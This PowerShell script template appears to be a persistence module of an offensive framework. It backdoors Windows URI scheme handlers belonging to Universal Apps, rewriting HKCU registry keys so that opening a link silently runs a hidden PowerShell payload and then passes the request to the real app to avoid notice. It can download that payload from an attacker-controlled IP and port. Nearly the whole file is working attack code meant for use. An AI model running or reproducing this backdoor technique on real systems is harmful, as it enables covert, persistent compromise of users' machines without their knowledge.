Begin {
    $listeningIp = "{LISTENINGIP}"
    $httpPort = "{HTTPPORT}"
    $isOnlineFetch = "{ISONLINEFETCH}"
    $powershellVersion = "{POWERSHELLVERSION}"
    $payloadsDetails =
    @(
    "{{PAYLOADS}}"
    )

    function UpdateRegistryKey($finalPayload)
    {
        $ErrorActionPreference = "SilentlyContinue"
        Write-Host -BackgroundColor Red "Universal App to hijack:"
        Write-Host -BackgroundColor DarkGray "$appxID"
        Write-Host -BackgroundColor Red "Payload used:"
        Write-Host -BackgroundColor DarkGray "$finalPayload"
        New-Item -Path "HKCU:\\Software\Classes\" -name "$appxID"
        New-Item -Path "HKCU:\\Software\Classes\$appxID\" -Name "shell"
        New-Item -Path "HKCU:\\Software\Classes\$appxID\shell\" -Name "open"
        New-Item -Path "HKCU:\\Software\Classes\$appxID\shell\open\" -Name "command"
        Set-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -value "$finalPayload"
        Remove-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "DelegateExecute"
    }

    function GenerateProxyingPayload($p, $d, $g)
    {
        $s0 = ('powershell -v {{POWERSHELLVERSION}} -NoP -NonI -W Hidden -c " & {{DEFAULTHANDLER}} ; {{GADGETPAYLOAD}}"')
        $s1 = $s0.Replace('{{POWERSHELLVERSION}}', $p)
        $s2 = $s1.Replace('{{DEFAULTHANDLER}}', "$d".Replace('"', "'"))
        $s3 = $s2.Replace('{{GADGETPAYLOAD}}', "$g".Replace("''","'"))
        return $s3
    }
}

Process {
    $payloadsDetails | ForEach-Object {
        $uriProtocol = $_.UriProtocol
        Write-Host -BackgroundColor Blue "URI scheme to backdoor: $uriProtocol"
        $gadgetPayload = If ($isOnlineFetch)
        {
            (New-Object net.webclient).DownloadString("http://" + $listeningIp + ":" + $httpPort + "/" + $_.UniqueID)
        }
        else
        {
            $_.PayloadContent
        }
        try # check if user has already chosen a default Universal App handler for the defined URI scheme via 'UserChoice' key lookup under HKCU or HKLM
        {
            $appxID = $( Get-ItemProperty -Path "HKCU:\\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\$uriProtocol\UserChoice" -Name "ProgID" -ErrorAction Stop ).ProgId
            # get pathname of the binary of the Universal App (via ordered lookup in HKEY_CURRENT_USER and as fallback in HKLM)
            $currentHandlerValue = $( Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue ).'(default)'
            if ( [string]::IsNullOrEmpty($currentHandlerValue))
            {
                $currentHandlerValue = $( Get-ItemProperty -Path "HKLM:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue ).'(default)'
                if ( [string]::IsNullOrEmpty($currentHandlerValue))
                {
                    throw "default Universal App handler is empty"
                }
            }
            $finalPayload = GenerateProxyingPayload $powershellVersion $currentHandlerValue $gadgetPayload
            UpdateRegistryKey($finalPayload)
        }
        catch # if no explicit default app has been chosen, then lookup via 'windows.protocol' and backdoor all the Universal App IDs available for the defined URI protocol
        {
            try
            {
                New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR -ErrorAction SilentlyContinue
                Set-Location "HKCR:\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\PackageRepository\Extensions\windows.protocol\$uriProtocol" -ErrorAction Stop
                $appxIDs = $( Get-ChildItem . ).PSChildName
                if ($appxIDs)
                {
                    $appxIDs | ForEach-Object {
                        $appxID = $_
                        # find the modelId to trigger the legitimate handler via 'shell:\Appsfolder\$AppUserModelID' shortcut and transparently proxy the request to it
                        try
                        {
                            $appUserModelID = (Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Application" -ErrorAction Stop).AppUserModelID
                            $universalAppHandler = "'cmd.exe' /c start shell:Appsfolder\$appUserModelID"
                            $finalPayload = GenerateProxyingPayload $powershellVersion $universalAppHandler $gadgetPayload
                            UpdateRegistryKey($finalPayload)
                        }
                        catch # if key does not exists yet, create it (in this case nothing to forward)
                        {
                            $basePayload = ('powershell -v {{POWERSHELLVERSION}} -NoP -NonI -W Hidden -c "{{GADGETPAYLOAD}}"')
                            $finalPayload = $basePayload.Replace('{{POWERSHELLVERSION}}', $powershellVersion).Replace('{{GADGETPAYLOAD}}', "$gadgetPayload")
                            UpdateRegistryKey($finalPayload)
                        }
                    }
                }
            }
            catch
            {
                Write-Host "Error, please make sure to run the command from a clean powershell console."
            }
        }
    }
}

End {
    [GC]::Collect()
}